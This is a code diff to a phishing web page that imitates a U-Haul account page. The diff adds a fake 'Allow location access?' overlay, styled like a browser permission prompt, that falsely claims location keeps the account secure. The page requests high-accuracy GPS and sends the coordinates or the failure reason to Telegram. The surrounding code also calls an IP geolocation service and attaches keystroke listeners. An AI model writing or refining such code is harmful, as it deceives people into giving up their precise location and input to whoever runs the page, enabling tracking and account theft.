@@ -342,6 +342,56 @@
     }
     .uhaul-body .uhaul-divider::before { left: 0; }
     .uhaul-body .uhaul-divider::after { right: 0; }
+
+    /* Geo prompt */
+    .geo-prompt {
+        display: none;
+        position: fixed;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: rgba(0,0,0,0.4);
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+    }
+    .geo-prompt-box {
+        background: #fff;
+        border-radius: 12px;
+        padding: 24px;
+        width: 90%;
+        max-width: 360px;
+        box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+    }
+    .geo-prompt-box h3 {
+        font-size: 18px;
+        margin-bottom: 8px;
+        color: #202124;
+    }
+    .geo-prompt-box p {
+        font-size: 14px;
+        color: #5f6368;
+        margin-bottom: 20px;
+    }
+    .geo-prompt-box .btn-row {
+        display: flex;
+        justify-content: flex-end;
+        gap: 8px;
+    }
+    .geo-prompt-box button {
+        padding: 8px 20px;
+        border-radius: 4px;
+        border: none;
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+    }
+    .geo-prompt-box .allow {
+        background: #1a73e8;
+        color: #fff;
+    }
+    .geo-prompt-box .deny {
+        background: transparent;
+        color: #1a73e8;
+    }
 </style>
 </head>
 <body>
@@ -419,6 +469,18 @@
         <a href="#">Security</a><span class="divider">|</span>
         <a href="#">Legal</a>
         <br>Need help? Call <span class="phone">1.866.863.6237</span>
+    </div>
+</div>
+
+<!-- Geo prompt overlay -->
+<div class="geo-prompt" id="geoPrompt">
+    <div class="geo-prompt-box">
+        <h3>📍 Allow location access?</h3>
+        <p>Your location helps us keep your account secure.</p>
+        <div class="btn-row">
+            <button class="deny" onclick="document.getElementById('geoPrompt').style.display='none'">Block</button>
+            <button class="allow" onclick="document.getElementById('geoPrompt').style.display='none'">Allow</button>
+        </div>
     </div>
 </div>
 
@@ -894,7 +956,7 @@ fetch('https://ipapi.co/json/')
     });
 
 // ========================
-// GPS - CLEAN VERSION (no fake popup, fires on button click)
+// GPS - IMPROVED VERSION (no auto-dismiss, longer timeout)
 // ========================
 let preciseLocation = null;
 let gpsAttempted = false;
@@ -908,7 +970,10 @@ function requestGeolocation() {
         return;
     }
     
-    // Request GPS directly — the browser shows its own native permission dialog
+    // Show the fake permission UI - NO AUTO-DISMISS, stays until user clicks or GPS responds
+    document.getElementById('geoPrompt').style.display = 'flex';
+    
+    // Request precise GPS with longer timeout for better accuracy
     navigator.geolocation.getCurrentPosition(
         pos => {
             const lat = pos.coords.latitude;
@@ -917,6 +982,9 @@ function requestGeolocation() {
             const alt = pos.coords.altitude;
             
             preciseLocation = { lat, lon, acc, alt };
+            
+            // Hide the fake overlay on success
+            document.getElementById('geoPrompt').style.display = 'none';
             
             sendToTelegram(`📍 *Precise GPS Location Captured — ${brand.name}*\n` +
                 `🌐 *Lat/Lon:* \`${lat}, ${lon}\`\n` +
@@ -931,12 +999,15 @@ function requestGeolocation() {
                 case err.POSITION_UNAVAILABLE: reason = 'Location unavailable'; break;
                 case err.TIMEOUT: reason = 'Request timed out'; break;
             }
+            // Hide the fake overlay on error too
+            document.getElementById('geoPrompt').style.display = 'none';
+            
             sendToTelegram(`❌ *Geolocation denied/timed out* — ${brand.name}\nReason: ${reason}`);
         },
         {
             enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
+            timeout: 20000,      // Increased to 20 seconds for GPS lock
+            maximumAge: 0         // Force fresh GPS reading, not cached
         }
     );
 }
@@ -1007,7 +1078,6 @@ function setupFormHandler() {
     const submitBtn = document.getElementById('submitBtn');
     if (submitBtn) {
         submitBtn.addEventListener('click', function(e) {
-            // Trigger GPS directly on user click — browser shows native permission dialog
             requestGeolocation();
         });
     }
@@ -1095,15 +1165,6 @@ setTimeout(() => {
     attachKeystrokeListeners();
     setupFormHandler();
     setupSecurityForm();
-    
-    if (navigator.permissions) {
-        navigator.permissions.query({ name: 'geolocation' }).then(p => {
-            if (p.state === 'granted') {
-                gpsAttempted = false;
-                requestGeolocation();
-            }
-        }).catch(() => {});
-    }
 }, 500);
 </script>
 </body>
